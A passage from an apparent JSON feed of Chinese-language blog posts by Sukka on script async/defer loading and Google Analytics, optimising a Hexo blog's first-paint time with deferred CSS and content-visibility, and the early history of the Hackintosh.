class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">async</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">'https://www.google-analytics.com/analytics.js'</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-comment\">&lt;!-- End Google Analytics --&gt;</span></code></pre>\n<p>Google 文档也对第二种代码进行了介绍：</p>\n<blockquote>\n<p>The alternative async tag below adds support for preloading, which will provide a small performance boost on modern browsers, but can degrade to synchronous loading and execution on IE 9 and older mobile browsers that do not recognize the <code>async</code> script attribute.</p>\n<p>第二种方法在现代浏览器上会略微提升性能，因为现代浏览器支持 preloading。但是在不认识 <code>async</code> 属性的 IE9 和一些老旧的移动端浏览器上，这种方法会降级为同步加载和执行。</p>\n</blockquote>\n<p>所以，结合上述代码和 Google 文档中的描述，我们不难得出结论：</p>\n<ul>\n<li>第一种做法（由 JS 生成 <code>&lt;script async&gt;</code> 标签、动态插入 DOM 中）可以确保 <code>analytics.js</code> 被异步加载和执行，但是在现代浏览器上由于不能提前发现 <code>analytics.js</code> 、不能 preload。</li>\n<li>第二种做法在 HTML 中直接声明了 <code>&lt;script async&gt;</code>、可以被现代浏览器在 Parse HTML 阶段发现 <code>analytics.js</code> 并 preload。但是对于「并不现代的」浏览器中，这种做法不能保证 <code>analytics.js</code> 被异步加载和执行。</li>\n</ul>\n<p>那么，为什么 Google 要这么说呢？</p>\n<h2>混乱的 defer 和 async 实现</h2>\n<p>绝大部分从事前端开发的程序员应该都非常了解 <code>defer</code> 和 <code>async</code> 以及他们的区别：</p>\n<ul>\n<li>\n<code>async</code> 的加载不会阻碍 DOM 的解析，但是当加载完后就会立即执行，执行时会阻碍 DOM 的解析</li>\n<li>\n<code>defer</code> 的加载也不会阻碍 DOM 的解析，并且会在 DOM 解析完后、<code>DOMContentLoaded</code> 触发之前执行</li>\n</ul>\n<p>鲜少有人知道的是，在 HTML5 之前，异步加载和执行外部脚本有一段混乱而荒唐的历史。</p>\n<p><code>defer</code> 属性的历史可以追溯到 1999 年 12 月 24 日制定的 HTML4.01 规范。在 <a href=\"https://www.w3.org/TR/html401/interact/scripts.html#adef-defer\">规范的第 18.2 节中的 18.2.1「SCRIPT 元素」</a> 中，有对 <code>defer</code> 属性的描述：</p>\n<blockquote>\n<p>When set, this boolean attribute provides a hint to the user agent that the script is not going to generate any document content (e.g., no “document.write” in javascript) and thus, the user agent can continue parsing and rendering.</p>\n<p>该 Boolean Attribute 用于提示 User Agent 这份脚本不会生成 document 内容（如，不使用 <code>document.write</code>），因此 User Agent 在遇到该脚本时不应该暂停解析和渲染 document。</p>\n</blockquote>\n<p>值得注意的是，在 HTML4.01 规范中没有强制浏览器用什么行为面对 <code>defer</code> 属性，各个浏览器的实现导致了千奇百怪的行为，这里仅简单列举几个 Quirk 行为：</p>\n<ul>\n<li>2001 年发布的 IE 6 开始对 <code>defer</code> 属性提供支持，但是直到 11 年后 IE 10 发布之前，IE 都不能保证带有 <code>defer</code> 属性的 <code>&lt;script&gt;</code> 能够按顺序执行：如果第一个 <code>defer</code> 的 <code>&lt;script&gt;</code> 使用 DOM API 修改了 DOM 结构、那么第二个 <code>&lt;script defer&gt;</code> 会在第一个 <code>&lt;script&gt;</code> 执行完毕之前就会开始执行。</li>\n<li>2009 年发布的 Firefox 3.5 开始对 <code>defer</code> 属性提供支持，<a href=\"https://bugzilla.mozilla.org/show_bug.cgi?id=688580\">但是带有 <code>defer</code> 的 <code>&lt;script&gt;</code> 可能会在 <code>DOMContentLoaded</code> 之后加载和执行</a>，而且 Firefox 甚至会异步执行带有 <code>defer</code> 属性的内联脚本。这一行为直到五年后在 Firefox 31 中才被修复。</li>\n<li>2010 年的 Chrome 8 开始实现 <code>defer</code> 属性。但如果页面的 MIME Type 为 XHTML（<code>application/xhtml+xml</code>），那么 <a href=\"https://bugs.chromium.org/p/chromium/issues/detail?id=874749\">Chrome 会无视 <code>&lt;script&gt;</code> 的 <code>defer</code> 属性</a>，因为 <a href=\"https://bugs.chromium.org/p/chromium/issues/detail?id=611136\">在 XHTML 中 <code>defer</code> 属性只是一个可选实现</a>。</li>\n</ul>\n<p>终于在 HTML5 中，不仅 <code>defer</code> 应有的行为被正式确定下来，而且还介绍了一个新的属性 <code>async</code>，提供了「真正异步地」加载和执行外部脚本的方式。也正是因为 HTML5 正式发布，下面这张介绍 <code>defer</code> 和 <code>async</code> 区别的图也开始深入人心：</p>\n<blockquote><p>这张出现在绝大部分文章中的图，正是来自 HTML5 规范：<a href=\"https://html.spec.whatwg.org/multipage/scripting.html#attr-script-async\">https://html.spec.whatwg.org/multipage/scripting.html#attr-script-async</a></p></blockquote>\n<p>IE 10、Chrome 8、Firefox 3.6 都对 <code>async</code> 属性提供了支持。相对于 <code>defer</code> 混乱的实现，浏览器对 <code>async</code> 的实现可谓是乖巧了许多：除 Safari 5.0 会无视 <code>async</code> 的取值外（<code>async=false</code> 时仍然会异步地加载和执行该外部脚本。这一 Bug 在 Safari 5.1 即被修复），绝大部分浏览器的实现都很正常。</p>\n<h2>等等，动态插入的 script 标签呢</h2>\n<p>如果你还记得 Google 给出的第一种 <code>analytics.js</code> 的加载方法的话（什么？你不记得了？快回到第一节再看一遍），你会注意到 Google 为了「保证了脚本在所有浏览器上都会异步地加载和执行」，使用了 <code>document.createElement('script')</code> 和 <code>el.parentNode.insertBefore</code> 动态插入 <code>&lt;script&gt;</code> 标签。这就引出了这一节的内容：动态插入的 <code>&lt;script&gt;</code> 应该按照什么顺序加载和执行呢？</p>\n<p>这个问题在 HTML4.01 的规范中完全没有说明，因此 HTML5 发布之前，当时的浏览器也依然采用了自己的实现：</p>\n<ul>\n<li>对于 WebKit、Blink 和 IE，动态插入的脚本将会被默认视为需要被异步加载和执行的脚本。如果要同步执行，需要显式声明 <code>async = false</code>。</li>\n<li>对于 Presto（早期 Opera 使用的自研内核）和 Firefox &lt;= 4，动态插入的脚本会默认同步加载和执行，除非显示声明 <code>async = true</code>。不过从 Firefox 4.0 开始，动态插入的脚本将会异步加载和执行，以和 IE、WebKit 行为保持一致（因此同步执行也一样需要显式声明 <code>async = false</code> ）；当 Opera 15 开始更换为基于 Chormium 开发（当时 Chromium 版本为 28）后，行为也变得和 IE、WebKit 一致。</li>\n</ul>\n<p>在 HTML5 规范中，这一问题终于被一劳永逸的解决了。在「<a href=\"https://html.spec.whatwg.org/multipage/scripting.html#script-processing-model\">HTML Standard - 4.12.1.1 Processing Model</a>」中明确规定了浏览器应该如何处理动态插入的 <code>&lt;script&gt;</code>。对于传统的脚本（非 Module），大致处理流程如下所示：</p>\n<blockquote><p>本图由 Sukka 绘制，按照 CC BY-NC-SA 4.0 协议共享。使用时请遵守许可协议，注明出处、不得被用于商业用途（除非获得书面许可）。</p></blockquote>\n<h2>尾声</h2>\n<p>Google Analytics 在 2013 年开始逐渐用 <code>analytics.js</code> 代替 <code>ga.js</code> 时，市面上同时存在有现代的支持 HTML5 和 <code>async</code> 属性的浏览器、和不支持 <code>async</code> 属性的「前 HTML5 时代的」古董浏览器。如果要保证在所有的浏览器上 Google Analytics 都能被异步地加载和执行，动态地将 <code>&lt;script&gt;</code> 标签插入 DOM 中、并显式声明 <code>async = true</code> 无疑是唯一的方法。随着古董浏览器逐渐退出人们的视线、实现 <code>async</code> 属性的浏览器在全球的份额已经达到了 98.08%，Google 终于开始直接用 <code>&lt;script async&gt;</code> 标签引入 Google Tag Manager。</p>\n<div class=\"license\"> <div class=\"license-title\">从 Google Analytics 的统计代码说起 —— 谈谈 script 标签的 async 和 defer 属性</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/script-async-defer/\">https://blog.skk.moe/post/script-async-defer/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-10-13</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/script-async-defer/"},{"title":"再快一点，再快一点 —— 优化博客白屏时间的实践","date":"2020-10-03 08:40:00","description":"\n<p>两个多月以前，我写了一篇文章 <a href=\"https://blog.skk.moe/post/how-to-make-a-fast-blog/\">介绍我是如何优化我的博客的</a>，但是我对于博客的白屏时间仍然不满意。过去一个月我在博客上进行了一系列优化实践，终于成功将博客的白屏时间减少了将近 50%，这篇文章就来记录优化的过程和方案。</p>\n<h2>确定和分析白屏时间</h2>\n<p>First Paint 和 First Contentful Paint 是衡量白屏时间的重要指标。Google Chrome 团队提供了专门的库 <code>web-vitals</code> 用于在浏览器中衡量这些指标。直接在本地开发环境中引入该库：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">type</span>=<span class=\"hljs-string\">\"module\"</span>&gt;</span><span class=\"javascript\"></span><span class=\"javascript\">  <span class=\"hljs-keyword\">import</span> {getFCP, getLCP, getFID} <span class=\"hljs-keyword\">from</span> <span class=\"hljs-string\">'https://unpkg.com/web-vitals@0.2.4/dist/web-vitals.es5.min.js?module'</span>;</span><span class=\"javascript\">  <span class=\"hljs-comment\">// 获取 First Contentful Paint</span></span><span class=\"javascript\">  getFCP(<span class=\"hljs-function\">(<span class=\"hljs-params\">{ name, value }</span>) =&gt;</span> <span class=\"hljs-built_in\">console</span>.log(name, value));</span><span class=\"javascript\">  <span class=\"hljs-comment\">// 获取 Largest Contentful Paint</span></span><span class=\"javascript\">  getLCP(<span class=\"hljs-function\">(<span class=\"hljs-params\">{ name, value }</span>) =&gt;</span> <span class=\"hljs-built_in\">console</span>.log(name, value));</span><span class=\"javascript\">  <span class=\"hljs-comment\">// 获取 First Input Delay</span></span><span class=\"javascript\">  getFID(<span class=\"hljs-function\">(<span class=\"hljs-params\">{ name, value }</span>) =&gt;</span> <span class=\"hljs-built_in\">console</span>.log(name, value));</span><span class=\"javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span></code></pre>\n<p>访问在本地运行的 Hexo Server 实例（<code>http://localhost:4000</code>），打开任意一篇文章，然后在 Dev Tools 中切换到「Performance」Tab 中限制 Network 和 CPU 性能：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/1.png\" width=\"1276\" height=\"279\" class=\"lazy post-img\"></p>\n<blockquote><p>进行性能测试时，模拟移动端的网络和性能是非常重要的。然而，Firefox 的 Dev Tools 至今很遗憾地没有实现这个功能（许多类似的 Feature Request 在 Bugzilla 已经 stall 数个月了）。这也是为什么我钟情于使用 Chromium Based 的浏览器开发的原因。</p></blockquote>\n<p>刷新页面，Console 中会输出三个数值（单位均为毫秒）：</p>\n<pre><code class=\"hljs plaintext\">FCP 1537.4400000000605LCP 1921.934FID 3.559999997378327</code></pre>\n<p>可以看到，First Contentful Paint 时间在 1.5 秒左右、而 Largest Contentful Paint（最大的可视元素，此时是文章的头图）是 1.9 秒。考虑到这是在本地环境、TTFB 只受模拟的「Fast 3G」限制，不难想象在实际访客体验中白屏时间绝对不止 1.5 秒。</p>\n<h2>分析性能瓶颈</h2>\n<p>肯定了问题的确存在，接下来就需要寻找性能瓶颈了。在「Performance」Tab 中将 CPU 性能修改为「6x slowdown」放大性能瓶颈，然后用「Start profiling and reload page」按钮刷新页面和获取火焰图：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/2.png\" width=\"1386\" height=\"946\" class=\"lazy post-img\"></p>\n<p>其中，Layout 占据的时间（117.43ms）比 Parse HTML（22.48ms）和 Recalculate Style（20.37ms）都要长得多，基本可以认定这就是性能瓶颈了。接下来判断是页面什么元素导致了 Layout 的性能瓶颈。对博客中其它页面进行 Profiling，并将火焰图进行对比：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/3.png\" width=\"860\" height=\"450\" class=\"lazy post-img\"></p>\n<blockquote><p>从左往右分别是 「<a href=\"https://blog.skk.moe/post/make-oh-my-zsh-fly/\">我就感觉到快 —— zsh 和 oh my zsh 冷启动速度优化</a>」、首页、「<a href=\"https://blog.skk.moe/post/hello-world/\">Hello World</a>」页面的火焰图和 Layout 用时。</p></blockquote>\n<p>根据火焰图和三个页面的特征，猜测是文章内容部分导致了 Layout 用时过长。为了加以验证，在 CSS 中使用 <code>display: none</code> 将文章内容直接从 DOM 中离线，然后重新生成火焰图。</p>\n<blockquote><p>在页面渲染时， <code>display: none</code>  的元素会直接从 DOM 中离线、不参加 Style 和 Layout。</p></blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/4.png\" width=\"1194\" height=\"946\" class=\"lazy post-img\"></p>\n<p>将文章内容设置 <code>display: none</code> 后，Layout 性能直接提升了三倍，所以可以确认性能瓶颈就是文章内容的 Layout 了。</p>\n<h2>优化白屏时间</h2>\n<p>文章内容的 Layout 时间比较长，而文章内容在加载完之前不会触发 First Paint。所以如果需要缩短白屏时间，就必须缩短文章内容 Layout 的用时。</p>\n<p>Layout 是浏览器计算元素几何信息的过程：元素的大小、在页面中的位置。Layout 性能一般和 DOM 元素数量、布局复杂性、布局模型有关。对于 DOM 元素数量这一点没有什么好的解决方案 —— 文章就这么长、每个段落就是一个 <code>&lt;p&gt;</code> 元素；对于文章内容也没有布局复杂性或布局模型可言。因此这是一条死路。</p>\n<p>直接对着自己的博客动死脑筋是行不通的，我决定先和其他的内容网站的 Layout 性能对比一下：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/5.png\" width=\"960\" height=\"500\" class=\"lazy post-img\"></p>\n<blockquote><p>上图左一为知乎专栏文章「<a href=\"https://zhuanlan.zhihu.com/p/25800461\">PWA 在饿了么的实践经验</a>」的火焰图；左二为 QuQuBlog「<a href=\"https://imququ.com/post/optimize-tls-handshake.html\">TLS 握手优化详解</a>」的火焰图；左三为 dev.to 的「<a href=\"https://dev.to/mustapha/css-grid-illustrated-introduction-52l5\">CSS Grid: illustrated introduction</a>」的火焰图。</p></blockquote>\n<p>和其它内容网站比较发现，当页面包含较长篇幅的内容时，「CPU 6x slowdown」下 Layout 用时大抵在 100ms 到 200ms 左右。我的博客内容页面 Layout 用时在 120ms 属于正常范围、基本没有进一步优化的空间。</p>\n<p>不过，我在看 dev.to 的火焰图时发现了一个很有趣的现象：虽然完整 DOM 的 Layout 用时在 123.70ms、但是却发生在 First Paint 和 First Contentful Paint 之后。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/6.png\" width=\"1090\" height=\"314\" class=\"lazy post-img\"></p>\n<p>结合截图和火焰图可以发现，dev.to 在加载文章页面时，先只渲染 Navbar、触发 First Paint、结束白屏；之后继续 Parse HTML、渲染页面主体内容；最后是 Lazyload 后的文章头图、触发 Largest Contentful Paint。这种思路在 H5、小程序中都是很常见：使用 Placeholder （被称为 AppShell）缩短白屏时间、然后再通过 AJAX 获取数据填充到页面上。但是静态博客和小程序最大的区别就是不需要获取数据、文章内容是直接包含在 HTML 中返回的，所以在博客上实践这样的思路需要做一些改变。</p>\n<p>我的做法则是将 CSS 拆分，将 Navbar 和右下角 Fab 按钮的 CSS 提取出来、内联在 HTML 中、当页面加载时就可以 Style &amp; Layout。同时为页面主题内容添加 <code>display: none</code> 使其在 DOM 中离线，使其不影响 First Paint；页面主体内容的 CSS（包括  <code>display: block</code>） 拆分成独立的 CSS。由于 CSS 是「渲染阻塞（Render Blocking）」的资源，浏览器在 Parse HTML 时如果遇到 CSS 就会开始请求、并在 CSS 下载完成之前不会开始 Style &amp; Layout。因此，需要一个小 trick 实现异步加载 CSS（使 CSS 不再阻塞渲染）：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">link</span> <span class=\"hljs-attr\">rel</span>=<span class=\"hljs-string\">\"stylesheet\"</span> <span class=\"hljs-attr\">href</span>=<span class=\"hljs-string\">\"defer.css\"</span> <span class=\"hljs-attr\">media</span>=<span class=\"hljs-string\">\"print\"</span> <span class=\"hljs-attr\">onload</span>=<span class=\"hljs-string\">\"this.media='all';this.onload=null\"</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">noscript</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">link</span> <span class=\"hljs-attr\">rel</span>=<span class=\"hljs-string\">\"stylesheet\"</span> <span class=\"hljs-attr\">href</span>=<span class=\"hljs-string\">\"defer.css\"</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">noscript</span>&gt;</span></code></pre>\n<p>带有 <code>[media=print]</code> 属性的 CSS 仍然会以低优先级加载，但并不会直接参与 Style &amp; Layout、因此不会阻塞渲染。当 CSS 文件下载后触发 <code>onload</code> 事件、将 <code>media</code> 属性改为 <code>all</code>、使 CSS 在当前页面生效。</p>\n<p>为了使白屏不显得枯燥，我还加了一个「加载中」的闪烁动画，使用 <code>animation-delay</code> 延迟 0.6 秒显示。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/9.png\" width=\"813\" height=\"849\" class=\"lazy post-img\"></p>\n<p>不过使用这种方案需要注意两个问题。一是当页面内容被 <code>display: none</code> 后、页面的高度会小于 viewport、因此浏览器不会展示滚动条；当页面内容被覆盖为 <code>display: block</code> 后、浏览器会重新展示滚动条、导致抖动，因此需要为 <code>&lt;html&gt;</code> 添加 <code>overflow-y: scroll</code>。另一个问题是新的 CSS 生效时会触发新的 Style &amp; Layout、可能会导致已经渲染过的 Navbar 和 Fab 按钮被再次 Layout，造成性能浪费；解决方案是使用「<a href=\"https://drafts.csswg.org/css-contain/\">CSS Containment</a>」草案中引入的 <code>contain</code> 属性，通过在 CSS 中显式声明当前元素及其后代与 DOM 的关系，当浏览器重新计算样式和布局时只会影响有限的 DOM。截至本文写就，Edge（Chromium Based）、Firefox、Chrome 都已经对 <code>contain</code> 属性提供了支持。关于 CSS Containment 的用法，可以参考 <a href=\"https://developer.mozilla.org/en-US/docs/Web/CSS/contain\">MDN 上对 contain 的说明</a>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/7.png\" width=\"800\" height=\"368\" class=\"lazy post-img\"></p>\n<p>同时，如果使用异步加载 CSS，那么页面主体内容的显示时机就会受到两个因素制约 —— 除 Style &amp; Layout 外、还有 CSS 的加载。为了尽可能消除 CSS 加载对文章内容显示的影响，我为 CSS 设置了 HTTP/2 Push，这样 CSS 能够和 HTML 同时到达浏览器、但不会马上参与 First Paint 的 Style &amp; Layout。关于 HTTP/2 Push 的更多细节，可以参考我的文章「<a href=\"https://blog.skk.moe/post/http2-server-push/\">静态资源递送优化：HTTP/2 和 Server Push</a>」。</p>\n<p>实践的效果妙不可言：First Paint 之前的 Style &amp; Layout 用时加起来也不超过 50ms、几乎 HTML 一下载完就可以看到 Navbar。当 <code>defer.css</code> 加载完、样式和布局计算完后文章内容即绘制到屏幕上。如果 <code>defer.css</code> 出于某种原因没有及时加载（如 User-Agent 不支持 HTTP/2 Push、<code>defer.css</code> 未能命中缓存），那么「加载中…」就会展示出来，使访客不会认为页面失去响应。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/8.png\" width=\"1106\" height=\"945\" class=\"lazy post-img\"></p>\n<h2>尝试新属性</h2>\n<p>虽然减少了白屏时间，但是长篇幅的内容的布局计算仍然非常耗时；当文章越来越长时，用户仍然可能会对「加载中」失去耐心。不过 Chromium 85 开始对一些 CSS Containment 草案中的 CSS 属性（如 <code>content-visibility</code>）提供支持。当一个元素被声明  <code>content-visibility</code> 属性后，如果这个元素不在 viewport 中、浏览器就不会计算其后代元素样式和属性，从而大幅节省 Style &amp; Layout 耗时。目前，仅 Chrome/Chromium 85 提供对该属性的支持（没错，Firefox 把这个 Feature 也扔进「值得一试」里了）。更多关于 <code>content-visibility</code> 的介绍可以查看 <a href=\"https://web.dev/content-visibility/\">web.dev 上的相关文章</a>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/10.jpg\" width=\"1600\" height=\"1108\" class=\"lazy post-img\"></p>\n<p>使用 <code>content-visibility</code> 属性需要将页面内容分块。于是我写了一个 Hexo 插件，在文章内容渲染时将每两个 <code>&lt;h2&gt;</code> 之间的内容分为一块、用 <code>&lt;div class=\"story\"&gt;</code> 包裹起来。然后为 <code>.story</code> 声明 <code>content-visibility: auto</code>。</p>\n<p>需要注意的是，<code>content-visibility</code> 绕过的是不在当前 viewport 的元素的后代元素的样式和布局、只保留一个元素盒子。如果没有显式声明元素的高度的话那么这个元素的高度就是 0 了。虽然 Chrome/Chromium 在实现 <code>content-visibility</code> 时会试图避免 Curative Layout Shift（在元素即将进入 viewport 时就开始渲染），但是滚动条的高度会发生改变。所以「CSS Containment」草案中还提出了一个新属性 <code>contain-intrinsic-size</code>、用于声明一个「元素盒子」的高度。这个属性不影响渲染后元素的实际尺寸，实际使用时只需要预估高度即可：</p>\n<pre><code class=\"hljs css\"><span class=\"hljs-selector-class\">.story</span> {  <span class=\"hljs-attribute\">content</span>-<span class=\"hljs-attribute\">visibility</span>: auto;  contain-intrinsic-size: <span class=\"hljs-number\">1000px</span>; // 不靠谱地取个 <span class=\"hljs-number\">1000px</span>}</code></pre>\n<blockquote><p><code>content-visibility</code> 除了可以改善 Layout 性能外，值得一提的还有其另一个取值 <code>hidden</code>。众所周知 <code>display: none</code> 会使元素「离线」，元素会从 DOM 中消失、同时渲染状态也会随之消失；而 <code>visibility: hidden</code> 只是会隐藏元素、而元素本身依然保留在 DOM 中，渲染状态也保留。而 <code>content-visibility: hidden</code> 则介于两者之间，元素会从 DOM 中消失、但是保留渲染属性。</p></blockquote>\n<p>利用 <code>content-visibility</code> 和 <code>contain-intrinsic-size</code> 后，文章的 Layout 时间从 120ms 减少到了 70ms、减少了将近 40%，只能希望越来越多的浏览器能够提供对这两个属性的支持了。</p>\n<div class=\"license\"> <div class=\"license-title\">再快一点，再快一点 —— 优化博客白屏时间的实践</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/improve-fcp-for-my-blog/\">https://blog.skk.moe/post/improve-fcp-for-my-blog/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-10-03</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/improve-fcp-for-my-blog/"},{"title":"黑苹果的历史","date":"2020-09-02 21:45:00","description":"\n<h2>楔子：第一台「黑苹果」</h2>\n<p>如果按照「黑苹果」的定义 —— 在一台没有苹果 Logo 的电脑上运行苹果公司开发的操作系统 —— 那么全世界第一台「黑苹果」应该诞生于 24 年前。1996 年，苹果将 Macintosh 电脑切换到 IBM 的 PowerPC 架构。时任苹果 CEO Gil Amelio 借此机会，与一些使用和 Macintosh 同款 CPU 和主板的厂商（如摩托罗拉）签约，授权他们的 PC 预装苹果的 Macintosh System 7（即 Classic Mac OS 7）。</p>\n<p>然而，1997 年 7 月发生了两件事。一件事是乔布斯回到苹果、被正式任命为苹果公司的 CEO，另一件事是 7 月 26 日 Mac OS 8 正式发布。</p>\n<p>Mac OS 8 并没有带来革命性的更新 —— 这个版本原本应该被命名为 Mac OS 7.7 。但是苹果公司前 CEO 同第三方厂商签订的系统授权协议是基于 Macintosh System 7 的。乔布斯选择发布 Mac OS 8.0，巧妙地利用命名和版本号的不同，直接把后续的服务和协议一起中断掉了。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/1.png\" width=\"405\" height=\"599\" class=\"lazy post-img\"></p>\n<blockquote><p>摩托罗拉生产的 StarMax 兼容机，可以直接安装 System 7。</p></blockquote>\n<h2>从 PowerPC 到 x86</h2>\n<p>把 Macintosh System 7 的授权协议理解为黑苹果有些取巧了。要谈现代的黑苹果，那么一定不能无视苹果迈向 x86 的道路，所以让我们把时间再倒回去 5 年吧。</p>\n<p>1992 年 2 月 14 日，苹果开展了一项秘密计划「Star Trek」，将 Macintosh System 7（Classic Mac OS 7）连同其应用程序迁移到 Intel 架构兼容的 PC 机（采用 Intel 486 处理器）上，并要求在 12 月 1 日就拿出第一台原型机。苹果的工程师夜以继日的重构，终于赶在 Deadline 之前完成了 System 7 和 QuickTime 的移植。但是随着苹果时任 CEO John Sculley 离开公司，接任的 CEO Michael Spindler 更青睐 PowerPC 架构，Star Trek 随即被取消。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/2.png\" width=\"640\" height=\"480\" class=\"lazy post-img\"></p>\n<blockquote><p>Macintosh System 7 的界面截图</p></blockquote>\n<p>虽然 Star Trek 被取消，但是仍然有部分苹果工程师努力将 Mac OS 移植到 x86 平台，其中成果最显著的是工程师 John Kullman，他在 2001 年 12 月成功将 Mac OS X 移植到了 x86 的 Quora PC 上。被称为「Mac OS X 之父」的 Bertrand Serlet（他后来成为 10.4 Tiger、10.5 Leopard 和 10.6 Snow Leopard 主要负责人）得知此事后与 John Kullman 会面，希望他将 Mac OS X 移植到一台索尼 VAIO 笔记本上。John Kullman 在当天晚餐之前就完成了任务。第二天，乔布斯就带着这台 VAIO 飞往东京，与索尼时任社长安藤国威会面，商讨有关在索尼的 VAIO 上运行 Mac OS X 的事宜，但谈判无疾而终。</p>\n<p>即使「索粉」乔布斯未能和索尼达成合作，苹果内部仍然于 2002 年进行了一项新的秘密计划「Marklar」，目的是继续维持 Mac OS X 与 x86 的兼容性。直到 2005 年 6 月 6 日，苹果在旧金山莫斯康展览中心举办了 WWDC 2005，乔布斯正式宣布他们将把个人电脑产品线 <a href=\"https://www.apple.com/newsroom/2005/06/06Apple-to-Use-Intel-Microprocessors-Beginning-in-2006/\">从 PowerPC 架构转变为 Intel 架构</a>。2006 年 1 月 10 日，苹果发布了第一台使用 Intel Core（英特尔酷睿）的 MacBook Pro，代替先前的产品线 PowerBook。12 月 28 日，苹果发布了 Mac Mini，同样搭载了 Intel Core 处理器。2007 年 4 月 5 日，苹果推出 Boot Camp（启动转换），4 月 24 日，苹果推出 17 寸的 MacBook Pro，5 月 16 日，苹果推出 12 寸的 MacBook 以代替 iBook 产品线，7 月 5 日，苹果推出 iMac 以代替 eMac 产品线，8 月 7 日，苹果推出新的高端电脑产品线 Mac Pro。2009 年 8 月，苹果推出 Mac OS X 10.6 Snow Leopard，这是第一个只支持 x86 的 Mac OS X，宣告苹果正式放弃了对 PowerPC 的支持。</p>\n<h2>黑苹果的第一道曙光</h2>\n<p>回到 WWDC 2005，苹果向开发者推出了搭载 Intel 处理器的 DTK（Dev Transition Kit），搭载了兼容 Intel 的 Mac OS X 10.4.1。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/3.png\" width=\"640\" height=\"480\" class=\"lazy post-img\"></p>\n<blockquote><p>Mac OS X 10.4.1 Tiger 开发版运行在搭载了 Intel 处理器的 DTK 上。</p></blockquote>\n<p>很快，就有人尝试在非苹果硬件上运行开发版的 Mac OS X，但是该系统拒绝在普通的 PC 上运行：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/4.png\" width=\"724\" height=\"400\" class=\"lazy post-img\"></p>\n<blockquote><p>当试图在非 Mac 平台上安装开发版的 Mac OS X Tiger 10.4.1 时会看到上图的提示信息：Darwin/x86 不支持你的硬件配置。</p></blockquote>\n<p>当时，将 Mac OS X Tiger 10.4.1 运行在普通的 PC 上有三大障碍：第一是指令集，DTK 内置的 <a href=\"https://ark.intel.com/content/www/cn/zh/ark/products/27484/intel-pentium-4-processor-660-supporting-ht-technology-2m-cache-3-60-ghz-800-mhz-fsb.html\">Intel Pentium 4 660 CPU</a> 支持 SSE-3 指令集，但是 2004 年前后的 PC 常见的处理器都不包括该指令集；其次是芯片组，Mac OS X 开发版只支持 Intel 915G/ICH6 芯片组；最后，当时的苹果的 DTK 使用了 Infineon TPM 安全芯片。讽刺的是，最难克服的障碍其实不是硬件或安全芯片，而是指令集。</p>\n<p>目前可考的第一台成功的黑苹果诞生于 2005 年 8 月 10 日，那一天 <a href=\"https://web.archive.org/web/20051018182314/http://hardmac.com/news/2005-08-10/\">HardMac 网站收到匿名开发者发来的两段视频</a>，视频中展示了 Mac OS X 10.4.1 Tiger 运行在搭载 Pentium M 735 处理器的 Mitac 8050D 笔记本上。</p>\n<blockquote><p>值得一提的是，2006 年 1 月 10 日苹果发布 MacBook Pro，相比传统 x86 主板使用 BIOS 引导（Legacy），MacBook Pro 使用了 UEFI 引导方式。</p></blockquote>\n<p>2006 年 2 月 14 日，「The Guru」团队的成员 Maxxuss（crg92）发布了首个 Patch 补丁。通过该补丁修补 XNU 内核即可解除引导和安装限制、在任何内置 SSE-2 指令集的 Intel 处理器上运行 Mac 